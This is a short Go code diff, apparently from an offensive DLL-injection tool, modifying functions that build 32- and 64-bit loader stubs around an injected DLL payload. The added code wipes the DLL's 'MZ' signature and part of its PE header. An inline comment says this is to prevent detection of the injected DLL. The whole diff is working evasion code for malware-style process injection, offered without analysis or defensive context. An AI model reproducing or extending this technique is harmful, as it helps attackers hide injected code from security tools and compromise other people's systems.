@@ -370,8 +370,12 @@ func buildLoader32(h uint32, b []byte) []byte {
 	d[37], d[38], d[39], d[40] = byte(h>>24), 0x50, 0xE8, 0x02
 	d[44], d[45] = 0xC9, 0xC3
 	n := 46 + copy(d[46:], loader32[:])
-	n += copy(d[n:], b)
-	d[n] = 0x41
+	d[n+copy(d[n:], b)] = 0x41
+	// Zero out 'MZ' sig to prevent detection of the injected DLL.
+	d[n], d[n+1] = 0, 0
+	for x := n + 0x4E; x < n+0x74; x++ {
+		d[x] = 0
+	}
 	return d
 }
 func buildLoader64(h uint32, b []byte) []byte {
@@ -394,7 +398,11 @@ func buildLoader64(h uint32, b []byte) []byte {
 	d[55], d[59], d[60], d[61] = 0x05, 0x48, 0x89, 0xF4
 	d[62], d[63] = 0x5E, 0xC3
 	n := 64 + copy(d[64:], loader64[:])
-	n += copy(d[n:], b)
-	d[n] = 0x41
+	d[n+copy(d[n:], b)] = 0x41
+	// Zero out 'MZ' sig to prevent detection of the injected DLL.
+	d[n], d[n+1] = 0, 0
+	for x := n + 0x4E; x < n+0x74; x++ {
+		d[x] = 0
+	}
 	return d
 }
